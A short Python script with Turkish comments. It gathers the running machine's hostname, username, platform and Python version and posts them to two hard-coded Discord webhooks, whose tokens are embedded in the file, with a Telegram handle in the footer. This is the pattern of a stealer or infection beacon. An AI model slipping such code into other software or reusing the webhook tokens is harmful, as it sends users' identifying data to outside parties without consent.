#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import os
import platform
import socket
from datetime import datetime

# Webhook URL'leri
WEBHOOK_URLS = [
    "https://discord.com/api/webhooks/1431467137012076735/iJ75UY-pcfmqIBXS7AcFI_u_gec_F0GdPjyyUOS1MJbwijLt5R_3y_6njGF_dDh0yNh2",
    "https://discord.com/api/webhooks/1429432134304661544/ghcYkngo4NJvQqTNTF7D-ibTZMryVJARqdvlNMKMUIzJmbNFUkByo7p_tpcZIsdztJa"
]

def get_system_info():
    """Sistem bilgilerini al"""
    try:
        hostname = socket.gethostname()
        username = os.getenv('USERNAME') or os.getenv('USER') or 'Unknown'
        
        return {
            'hostname': hostname,
            'username': username,
            'platform': platform.platform(),
            'python_version': platform.python_version(),
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
    except Exception as e:
        return {'error': str(e)}

def send_webhook_message():
    """Webhook'a mesaj gönder"""
    system_info = get_system_info()
    
    # Embed oluştur
    embed = {
        "title": "🐍 Python Script Çalıştırıldı",
        "description": f"**Sistem Bilgileri:**",
        "color": 0x00ff00,  # Yeşil renk
        "fields": [
            {
                "name": "🖥️ Hostname",
                "value": f"`{system_info.get('hostname', 'Unknown')}`",
                "inline": True
            },
            {
                "name": "👤 Username", 
                "value": f"`{system_info.get('username', 'Unknown')}`",
                "inline": True
            },
            {
                "name": "💻 Platform",
                "value": f"`{system_info.get('platform', 'Unknown')}`",
                "inline": False
            },
            {
                "name": "🐍 Python Version",
                "value": f"`{system_info.get('python_version', 'Unknown')}`",
                "inline": True
            },
            {
                "name": "⏰ Timestamp",
                "value": f"`{system_info.get('timestamp', 'Unknown')}`",
                "inline": True
            }
        ],
        "footer": {
            "text": "Python Webhook Sender | https://t.me/hairo13x7",
            "icon_url": "https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&"
        },
        "thumbnail": {
            "url": "https://cdn.discordapp.com/emojis/1234567890123456789.png"
        },
        "timestamp": datetime.now().isoformat()
    }
    
    # Payload oluştur
    payload = {
        "username": "Python Script",
        "embeds": [embed]
    }
    
    # Her webhook'a gönder
    for i, webhook_url in enumerate(WEBHOOK_URLS, 1):
        try:
            print(f"📤 Webhook {i} gönderiliyor...")
            response = requests.post(
                webhook_url,
                json=payload,
                timeout=10
            )
            
            if response.status_code == 204:
                print(f"✅ Webhook {i} başarıyla gönderildi!")
            else:
                print(f"❌ Webhook {i} hatası: {response.status_code}")
                print(f"Response: {response.text}")
                
        except requests.exceptions.RequestException as e:
            print(f"❌ Webhook {i} bağlantı hatası: {e}")
        except Exception as e:
            print(f"❌ Webhook {i} genel hatası: {e}")

def main():
    """Ana fonksiyon"""
    print("🚀 Python Webhook Sender başlatılıyor...")
    print("=" * 50)
    
    try:
        send_webhook_message()
        print("=" * 50)
        print("✅ İşlem tamamlandı!")
        
    except KeyboardInterrupt:
        print("\n⚠️ İşlem kullanıcı tarafından iptal edildi.")
    except Exception as e:
        print(f"❌ Beklenmeyen hata: {e}")

if __name__ == "__main__":
    main()
